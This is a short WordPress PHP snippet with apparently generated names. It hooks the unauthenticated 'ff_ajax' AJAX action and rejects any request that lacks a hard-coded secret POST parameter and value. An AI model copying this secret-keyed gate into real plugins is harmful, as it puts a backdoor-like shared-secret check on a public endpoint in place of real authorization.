<?php

function project_term_instagram_jigoshop() {
	if (!isset($_POST["ncojhljcfojgtwj"]) || $_POST["ncojhljcfojgtwj"] !== "mlRCZsSWIvrk") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'project_term_instagram_jigoshop', 5, 1);
